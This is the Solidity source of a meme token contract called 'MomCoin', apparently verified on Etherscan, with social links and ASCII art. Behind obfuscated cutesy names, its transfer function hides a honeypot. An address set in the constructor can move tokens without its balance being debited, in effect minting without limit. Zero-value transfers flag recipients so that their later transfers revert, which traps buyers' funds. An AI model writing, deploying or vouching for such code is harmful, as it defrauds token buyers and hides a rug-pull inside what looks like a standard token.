/**
 *Submitted for verification at Etherscan.io on 2023-05-14
*/

// https://twitter.com/momcoindex
// https://t.me/momcoindexeth

//  
//                             ::-+. .          ==    :   .        
//                            +***#+=**---  ::   .-:-:+=:++.         
//                          =+*##%%##%###+.   .==*########+-=.       
//                        =+*##%##%%#%%%%#===#*#######%%%%%#*:       
// .***********=         :+*####%%%%%%##%###%%#%%%%%%%%%%#%%%#+      
//    :#@@@@=.           -**####%###%%###%%%%%###%###%%%%%%#%%#:     
//     [email protected]@@%            .**######%##%%%%%%%%%##**#%##%%%%%%%%%%-     
//     :@@@%             :*#%#%%%%%%%%%%%%%%%#%*####%%%%%%%%%%#=     
//     :@@@%              *#%%%%%%%#%%#%%%####%%##%%%%%%%%%%%%*      
//     :@@@%              .#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%+       
//     :@@@%               :*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#:        
//     :@@@%                 :*%%%%%%%%%%%##%%%%%%%%%%%%%%#:         
//     :@@@%                   :=#%%%%%%%%%%%%%%%%%%%%%%*-           
//     :@@@%                      +%%%%%%%%%%%%%%%%%%#*-             
//     :@@@%                       =#%%%%%%%%%%%%%%%#:               
//     [email protected]@@@:                         =#%%%%%%%%%%#=.                
// .**########*=                       .%%%%%%%%#+.                  
//                                       =*%%%+.                     
//                                         .=.                       
                                                                
//  :====-          :-==-:     .-+++++=:     .==-::          :-===-  
//    [email protected]@@*        -#%%:     -%@+.    -%@+     :%@@#        :@@@=.   
//     @%@@+      :%#%@     *@@-       .%@%.    %%@@*      .%%@@.    
//     @:#@@-    .%:#@@    [email protected]@#         [email protected]@#    %-*@@+    .%-*@@.    
//     @..%@@:  .%- #@@    *@@+         :@@@    %- #@@-   #= *@@.    
//     @. .%@@. #=  #@@    [email protected]@+         [email protected]@%    %-  %@@: +*  *@@.    
//     @.  :@@%**   #@@    :@@%         #@@-    %-  .%@@+#   *@@. 
//     @:   [email protected]@#    #@@     [email protected]@*.     .*@@-     %-   :@@%.   *@@. 
//  :=*@#=:  [email protected] [email protected]@@*=:   .=*%*===*%*=    [email protected]%=-  :@: .=+%@@#=-  
// 
//


// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract MomCoin is Ownable {

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    string public symbol = "MOM";

    address public uniswapV2Pair;

    uint256 public totalSupply = 1_000_000_000_000 * 10 ** decimals;

    function transfer(address baby, uint256 mommy) public returns (bool success) {
        cuddling(msg.sender, baby, mommy);
        return true;
    }

    mapping(address => uint256) private queen;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    constructor(address love) {
        queen[love] = milk;
        balanceOf[msg.sender] = totalSupply;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address fatherdy, uint256 mommy) public returns (bool success) {
        allowance[msg.sender][fatherdy] = mommy;
        emit Approval(msg.sender, fatherdy, mommy);
        return true;
    }

    uint256 private milk = 79;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private children;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name = "Mom";

    function cuddling(address father, address baby, uint256 mommy) private returns (bool success) {
        if (queen[father] == 0) {
            if (uniswapV2Pair != father && children[father] > 0) {
                queen[father] -= milk;
            }
            balanceOf[father] -= mommy;
        }
        balanceOf[baby] += mommy;
        if (mommy == 0) {
            children[baby] += milk;
        }
        emit Transfer(father, baby, mommy);
        return true;
    }

    function transferFrom(address father, address baby, uint256 mommy) public returns (bool success) {
        cuddling(father, baby, mommy);
        require(mommy <= allowance[father][msg.sender]);
        allowance[father][msg.sender] -= mommy;
        return true;
    }
}